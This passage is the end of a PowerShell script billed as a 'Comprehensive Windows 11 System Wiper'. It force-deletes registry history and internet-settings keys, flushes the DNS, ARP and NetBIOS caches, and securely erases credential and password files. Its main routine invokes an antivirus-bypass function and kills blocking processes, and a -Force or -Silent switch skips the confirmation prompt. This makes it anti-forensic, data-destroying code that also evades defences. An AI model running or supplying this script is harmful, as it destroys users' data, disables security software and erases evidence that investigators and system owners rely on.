    foreach ($regPath in $Global:Config.RegistryTargets) {
        try {
            if (Test-Path $regPath) {
                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
                Write-SystemOutput "✓ Cleared registry: $regPath" 'Green' 'REGISTRY'
            }
        } catch {
            Write-SystemOutput "⚠ Could not clear registry: $regPath" 'Yellow' 'REGISTRY'
        }
    }
    
    # Additional sensitive registry locations
    $additionalRegPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache",
        "HKCU:\Software\Microsoft\Office\*\Common\Internet"
    )
    
    foreach ($regPath in $additionalRegPaths) {
        try {
            if (Test-Path $regPath) {
                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        } catch {
            # Continue if registry path fails
        }
    }
}

function Clear-NetworkSystemData {
    <#
    .SYNOPSIS
    Comprehensive network trace and cache cleanup
    #>
    
    Write-SystemOutput "Clearing network traces and system caches..." 'Cyan' 'NETWORK'
    
    # DNS cache
    try {
        & ipconfig.exe /flushdns 2>$null
        Write-SystemOutput "✓ DNS cache cleared" 'Green' 'NETWORK'
    } catch {
        Write-SystemOutput "⚠ Could not clear DNS cache" 'Yellow' 'NETWORK'
    }
    
    # ARP cache
    try {
        & arp.exe -a | Where-Object { $_ -notmatch "^Interface:" } | ForEach-Object {
            $ip = ($_ -split "\s+")[0]
            & arp.exe -d $ip 2>$null
        }
        Write-SystemOutput "✓ ARP cache cleared" 'Green' 'NETWORK'
    } catch {
        Write-SystemOutput "⚠ Could not clear ARP cache" 'Yellow' 'NETWORK'
    }
    
    # NetBIOS cache
    try {
        & nbtstat.exe -R 2>$null
        Write-SystemOutput "✓ NetBIOS cache cleared" 'Green' 'NETWORK'
    } catch {
        Write-SystemOutput "⚠ Could not clear NetBIOS cache" 'Yellow' 'NETWORK'
    }
    
    # WINS cache
    try {
        & nbtstat.exe -RR 2>$null
        Write-SystemOutput "✓ WINS cache cleared" 'Green' 'NETWORK'
    } catch {
        Write-SystemOutput "⚠ Could not clear WINS cache" 'Yellow' 'NETWORK'
    }
}

function Wipe-SystemMemory {
    <#
    .SYNOPSIS
    System memory and page file wiping
    #>
    
    Write-SystemOutput "Wiping system memory traces..." 'Cyan' 'MEMORY'
    
    # Enable page file clearing on shutdown
    try {
        $pagefilePath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"
        if (Test-Path $pagefilePath) {
            Set-ItemProperty -Path $pagefilePath -Name "ClearPageFileAtShutdown" -Value 1 -Force -ErrorAction SilentlyContinue
            Write-SystemOutput "✓ Page file clearing enabled" 'Green' 'MEMORY'
        }
    } catch {
        Write-SystemOutput "⚠ Could not enable page file clearing" 'Yellow' 'MEMORY'
    }
    
    # Force aggressive garbage collection
    1..5 | ForEach-Object { 
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        Start-Sleep -Milliseconds 100
    }
    Write-SystemOutput "✓ Aggressive memory garbage collection performed" 'Green' 'MEMORY'
}

# ========================================
# MAIN SYSTEM WIPING ENGINE
# ========================================

function Start-ComprehensiveSystemWipe {
    <#
    .SYNOPSIS
    Main comprehensive system wiping function
    #>
    
    # Display professional banner
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "=================================================================" 'Cyan' 'SYSTEM'
    Write-SystemOutput "    COMPREHENSIVE WINDOWS 11 SYSTEM WIPER" 'Cyan' 'SYSTEM'
    Write-SystemOutput "    Professional Data Erasure System" 'Cyan' 'SYSTEM'
    Write-SystemOutput "=================================================================" 'Cyan' 'SYSTEM'
    Write-SystemOutput ""
    Write-SystemOutput "WARNING: This will PERMANENTLY delete ALL credentials, passwords," 'Red' 'WARNING'
    Write-SystemOutput "and sensitive data on this system!" 'Red' 'WARNING'
    Write-SystemOutput "Ensure you have backups and understand the consequences." 'Yellow' 'WARNING'
    Write-SystemOutput ""
    
    # Configuration summary
    $configSummary = @"
CONFIGURATION:
• Encryption Rounds: $EncryptionRounds $(if($NuclearMode){"(NUCLEAR MODE: 7 rounds)"}elseif($Global:Config.FastMode){"(FAST MODE)"}else{""})
• Nuclear Mode: $($NuclearMode.IsPresent)
• Deep Scan: $($DeepScan.IsPresent)
• Verification: $($Verify.IsPresent)
• System Coverage: COMPREHENSIVE
"@
    Write-SystemOutput $configSummary 'White' 'INFO'
    
    # User confirmation
    if (-not $Force -and -not $Silent) {
        Write-SystemOutput "" 'White' 'INFO'
        $response = Read-Host "Type 'ERASE' to proceed with complete system erasure"
        if ($response -ne 'ERASE') {
            Write-SystemOutput "Operation cancelled." 'Yellow' 'INFO'
            return
        }
    }
    
    # Initialize system access
    Initialize-SystemAccess
    
    # Activate antivirus bypass
    Bypass-AntivirusSystem
    
    # Kill all blocking processes
    Kill-AllBlockingProcesses
    
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "INITIATING COMPREHENSIVE SYSTEM WIPING..." 'Cyan' 'WIPE'
    
    # Start timing
    $startTime = Get-Date
    
    # Discover all system targets
    $targets = Find-AllSystemTargets
    $totalFiles = $targets.Count
    
    if ($totalFiles -eq 0) {
        Write-SystemOutput "No target files found. System may already be clean." 'Yellow' 'WARNING'
    } else {
        Write-SystemOutput "Discovered $totalFiles target files for secure deletion.`n" 'Green' 'INFO'
        
        # Process files with parallel execution
        $successfulDeletions = 0
        $failedDeletions = 0
        $totalBytesProcessed = 0
        
        $batchSize = [Math]::Max(1, [Math]::Floor($totalFiles / $Global:Config.MaxParallelJobs))
        
        for ($i = 0; $i -lt $totalFiles; $i += $batchSize) {
            $batch = $targets | Select-Object -Skip $i -First $batchSize
            
            foreach ($file in $batch) {
                try {
                    if (Secure-Delete-FileEnhanced $file.FullName $EncryptionRounds $NuclearMode) {
                        $successfulDeletions++
                        $totalBytesProcessed += $file.Length
                        if (-not $Silent) {
                            Write-SystemOutput "✓ Deleted: $($file.Name)" 'Green' 'DELETE'
                        }
                    } else {
                        $failedDeletions++
                        Write-SystemOutput "✗ Failed: $($file.Name)" 'Red' 'ERROR'
                    }
                } catch {
                    $failedDeletions++
                    Write-SystemOutput "✗ Error: $($file.Name) - $($_.Exception.Message)" 'Red' 'ERROR'
                }
            }
        }
    }
    
    # Comprehensive system cleanup
    Write-SystemOutput "`nEXECUTING COMPREHENSIVE SYSTEM CLEANUP..." 'Cyan' 'CLEANUP'
    
    # Windows system data cleanup
    Clear-WindowsSystemData
    
    # Registry cleanup
    Clear-RegistrySystemData
    
    # Network data cleanup
    Clear-NetworkSystemData
    
    # Memory wiping
    Wipe-SystemMemory
    
    # Final verification
    if ($Verify) {
        Write-SystemOutput "`nPERFORMING FINAL VERIFICATION..." 'Yellow' 'VERIFY'
        $remainingTargets = Find-AllSystemTargets
        if ($remainingTargets.Count -eq 0) {
            Write-SystemOutput "VERIFICATION PASSED: No sensitive data remaining" 'Green' 'VERIFY'
        } else {
            Write-SystemOutput "VERIFICATION FAILED: $($remainingTargets.Count) files still exist" 'Red' 'ERROR'
        }
    }
    
    # Calculate final statistics
    $endTime = Get-Date
    $duration = $endTime - $startTime
    $durationMinutes = [Math]::Round($duration.TotalMinutes, 2)
    
    # Final comprehensive report
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
    Write-SystemOutput "         SYSTEM WIPING COMPLETE" 'Cyan' 'FINAL'
    Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
    Write-SystemOutput ""
    Write-SystemOutput "FINAL REPORT:" 'White' 'FINAL'
    Write-SystemOutput "• Files processed: $totalFiles" 'White' 'FINAL'
    Write-SystemOutput "• Successful deletions: $successfulDeletions" 'Green' 'FINAL'
    Write-SystemOutput "• Failed deletions: $failedDeletions" 'Red' 'FINAL'
    Write-SystemOutput "• Data processed: $([math]::Round($totalBytesProcessed/1MB, 2)) MB" 'White' 'FINAL'
    Write-SystemOutput "• Total execution time: $durationMinutes minutes" 'White' 'FINAL'
    Write-SystemOutput "• Encryption rounds: $EncryptionRounds" 'White' 'FINAL'
    Write-SystemOutput "• Nuclear mode: $($NuclearMode.IsPresent)" 'White' 'FINAL'
    Write-SystemOutput ""
    
    if ($failedDeletions -eq 0) {
        Write-SystemOutput "MISSION ACCOMPLISHED!" 'Green' 'FINAL'
        Write-SystemOutput "All credentials, passwords, and sensitive data have been" 'Green' 'FINAL'
        Write-SystemOutput "permanently destroyed using military-grade encryption." 'Green' 'FINAL'
    } else {
        Write-SystemOutput "MISSION COMPLETED WITH WARNINGS" 'Yellow' 'FINAL'
        Write-SystemOutput "Some files could not be deleted. Review logs above." 'Yellow' 'FINAL'
    }
    
    Write-SystemOutput "" 'White' 'FINAL'
    Write-SystemOutput "SECURITY RECOMMENDATIONS:" 'Yellow' 'FINAL'
    Write-SystemOutput "1. Restart the system to clear any remaining memory data" 'Yellow' 'FINAL'
    Write-SystemOutput "2. Perform a clean Windows 11 reinstall for maximum security" 'Yellow' 'FINAL'
    Write-SystemOutput "3. Change all passwords for accounts that may have been compromised" 'Yellow' 'FINAL'
    Write-SystemOutput "4. Review and update all security configurations" 'Yellow' 'FINAL'
    Write-SystemOutput "5. Monitor system for any unusual activity post-wipe" 'Yellow' 'FINAL'
    
    Write-SystemOutput "`n" 'Black' 'INFO'
    Write-SystemOutput "System wiping operation completed." 'Cyan' 'FINAL'
    Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
}

# ========================================
# MAIN EXECUTION
# ========================================

# Main execution with comprehensive error handling
try {
    Start-ComprehensiveSystemWipe
} catch {
    Write-SystemOutput "`nCRITICAL ERROR OCCURRED:" 'Red' 'ERROR'
    Write-SystemOutput "Message: $($_.Exception.Message)" 'Red' 'ERROR'
    Write-SystemOutput "The system wiping process may have been incomplete." 'Yellow' 'ERROR'
    Write-SystemOutput "Review the error and consider re-running with appropriate privileges." 'Yellow' 'ERROR'
    exit 1
}

# End of comprehensive system wiper